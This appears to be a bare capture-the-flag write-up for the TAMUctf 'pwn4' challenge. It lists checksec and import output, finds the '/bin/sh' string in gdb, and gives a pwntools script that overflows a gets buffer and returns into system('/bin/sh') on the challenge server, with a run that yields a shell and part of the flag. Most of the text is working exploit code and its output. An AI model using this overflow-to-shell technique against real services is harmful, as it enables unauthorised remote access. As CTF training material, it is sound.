```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
```bash
root@kali:~/Desktop/tamuctf# rabin2 -i pwn4 
[Imports] 
ordinal=001 plt=0x080483f0 bind=GLOBAL type=FUNC name=strcmp 
ordinal=002 plt=0x08048400 bind=GLOBAL type=FUNC name=printf 
ordinal=003 plt=0x08048410 bind=GLOBAL type=FUNC name=gets 
ordinal=004 plt=0x08048420 bind=GLOBAL type=FUNC name=puts 
ordinal=005 plt=0x08048430 bind=GLOBAL type=FUNC name=system 
ordinal=006 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__ 
ordinal=007 plt=0x08048440 bind=GLOBAL type=FUNC name=exit 
ordinal=008 plt=0x08048450 bind=GLOBAL type=FUNC name=__libc_start_main 
ordinal=009 plt=0x08048460 bind=GLOBAL type=FUNC name=setvbuf 
ordinal=010 plt=0x08048470 bind=GLOBAL type=FUNC name=putchar 
```

```gdb
gdb-peda$ find /bin/sh 
Searching for '/bin/sh' in: None ranges 
Found 2 results, display max 2 items: 
pwn4 : 0x804a038 ("/bin/sh") 
libc : 0xf7f40c0a ("/bin/sh") 
```

```python
from pwn import * 
r = remote('pwn.ctf.tamu.edu', 4324) 
r.recvuntil('Input>') 

chain  = 'A'*32 
chain += p32(0x08048430) 
chain += p32(0x08048440)
chain += p32(0x804a038) 

r.send(chain+'\n') 
r.interactive() 
```

```bash
root@kali:~/Desktop/tamuctf# python pwn4.py  
[+] Opening connection to pwn.ctf.tamu.edu on port 4324: Done 
[*] Switching to interactive mode 
 Unkown Command 

$ id 
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf) 
ck_70_7h3_l1br4ry} 
```
